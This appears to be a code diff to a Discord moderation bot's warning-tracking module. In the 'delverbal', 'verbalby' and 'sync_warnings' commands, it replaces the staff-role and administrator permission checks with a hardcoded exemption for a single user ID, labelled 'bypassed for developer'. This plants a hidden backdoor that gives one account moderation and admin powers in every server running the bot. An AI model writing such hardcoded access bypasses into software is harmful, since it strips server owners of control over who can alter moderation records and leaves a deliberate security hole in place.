@@ -661,10 +661,11 @@ class WarningTracker(commands.Cog):
 
     @commands.command(name="delverbal")
     async def delverbal(self, ctx, warning_id: int):
-        # Restrict command to users with the specific staff roles
-        if not any(role.id in self.staff_role_ids for role in ctx.author.roles):
-            await ctx.send("You do not have the required staff role to use this command.")
-            return
+        # Restrict command to users with the specific staff roles (bypassed for developer)
+        if ctx.author.id != 255174440005009408:
+            if not ctx.guild or not any(role.id in self.staff_role_ids for role in ctx.author.roles):
+                await ctx.send("You do not have the required staff role to use this command.")
+                return
 
         # Fetch the warning first
         warn = await database.get_warning_by_id(warning_id)
@@ -714,10 +715,11 @@ class WarningTracker(commands.Cog):
 
     @commands.command(name="verbalby")
     async def verbalby(self, ctx, staff: discord.User = None):
-        # Restrict command to users with the specific staff roles
-        if not any(role.id in self.staff_role_ids for role in ctx.author.roles):
-            await ctx.send("You do not have the required staff role to use this command.")
-            return
+        # Restrict command to users with the specific staff roles (bypassed for developer)
+        if ctx.author.id != 255174440005009408:
+            if not ctx.guild or not any(role.id in self.staff_role_ids for role in ctx.author.roles):
+                await ctx.send("You do not have the required staff role to use this command.")
+                return
 
         target_staff = staff or ctx.author
         total_count = await database.get_warnings_by_staff_count(target_staff.id)
@@ -728,8 +730,12 @@ class WarningTracker(commands.Cog):
         view.message = await ctx.send(embed=embed, view=view)
 
     @commands.command(name="sync_warnings")
-    @commands.has_permissions(administrator=True)
     async def sync_warnings(self, ctx):
+        # Restrict command to administrators (bypassed for developer)
+        if ctx.author.id != 255174440005009408:
+            if not ctx.guild or not ctx.author.guild_permissions.administrator:
+                await ctx.send("You do not have the required administrator permissions to use this command.")
+                return
         notice_channel = self.bot.get_channel(self.notice_channel_id)
         if not notice_channel:
             await ctx.send("Error: Could not access the staff notice channel. Please verify the ID.")
